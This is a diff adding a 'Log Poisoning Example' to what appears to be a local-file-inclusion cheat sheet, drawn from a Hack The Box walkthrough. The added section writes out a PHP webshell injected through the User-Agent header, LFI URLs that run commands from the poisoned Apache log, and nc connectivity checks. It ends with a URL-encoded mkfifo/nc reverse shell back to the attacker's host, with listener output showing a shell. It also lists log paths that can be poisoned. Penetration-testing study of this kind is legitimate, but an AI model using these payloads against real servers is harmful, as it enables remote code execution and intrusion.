@@ -347,7 +347,7 @@ C:\xampp\tomcat\conf\server.xml
 
 ## Log Poisoning
 ```
-The following log files are controllable and can be included with an evil payload to achieve a command execution
+The following log files are controllable and can be included with an evil payload to achieve a command execution:
 
 /var/log/apache/access.log
 /var/log/apache/error.log
@@ -360,6 +360,73 @@ The following log files are controllable and can be included with an evil payloa
 /var/log/sshd.log
 /var/log/mail
 ```
+
+## Log Poisoning Example
+```
+The idea behind log poisoning is to put some php into the logs, and then load them where php will be executed. If we look at the access log, we see that on each visit to the site, there’s an entry written with the url visited and the user-agent string of the browser visiting.
+
+The simplest case would be to change our user-agent string such that it includes php, and then include that log file with our LFI. We could also poison the url field, but visiting something like http://10.10.10.84/browse.php?not_an_arg=[php code]. As long as we can get our php written into the log, we will succeed.
+
+Finding the Logs
+Next, we’ll want to find the httpd.conf file, which will tell us where the log files are located.
+We’ll find that at /usr/local/etc/apache24/httpd.conf, and if we get that file (using the url http://10.10.10.84/browse.php?file=/usr/local/etc/apache24/httpd.conf), we’ll see the locations of the access and error logs:
+
+ErrorLog "/var/log/httpd-error.log"
+CustomLog "/var/log/httpd-access.log" combined
+
+Log Poisoning
+Lines in our access log look like this:
+10.10.14.4 - - [19/Mar/2018:13:28:50 +0100] "GET /HNAP1 HTTP/1.1" 404 203 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+
+We’ll modify our user-agent using burp to add a webshell. I always like to add a marker here (like “0xdf:”), so that as the log file grows, we can easily locate our output, either with ctrl-f, or using curl and grep.
+
+GET / HTTP/1.1
+Host: 10.10.10.84
+User-Agent: 0xdf: <?php system($_GET['c']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Then visit: http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=id
+
+Reverse Shell
+Just like we didn’t need the webshell, we don’t really need a reverse shell to complete Poison. Even if we hadn’t found pwdbackup.txt with listfiles.php, we still could find it now running ls in our webshell. Still, the fun of HTB is getting shells, so let’s get one with this web shell.
+Check Connectivity
+
+A ping shows that we can generate outbound network traffic back to our host:
+
+view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=ping 10.10.14.6
+
+root@kali# tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+13:03:55.775947 IP 10.10.10.84 > kali: ICMP echo request, id 30469, seq 0, length 64
+13:03:55.775985 IP kali > 10.10.10.84: ICMP echo reply, id 30469, seq 0, length 64
+13:03:56.799382 IP 10.10.10.84 > kali: ICMP echo request, id 30469, seq 1, length 64
+13:03:56.799404 IP kali > 10.10.10.84: ICMP echo reply, id 30469, seq 1, length 64
+
+A quick test with nc shows that we can get tcp connections back as well:
+
+view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=nc 10.10.14.6 8081
+
+Shell as www
+
+So let’s use the robust pipe shell from Pentest Monkey’s Cheatsheet and get a shell. Visit view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.6%209001%20%3E/tmp/f, and:
+
+root@kali# nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.84] 19226
+sh: can't access tty; job control turned off
+$ pwd
+/usr/local/www/apache24/data
+$ id
+uid=80(www) gid=80(www) groups=80(www)
+
+
+```
+
 
 ## Traversal sequences stripped non-recursively
 ```
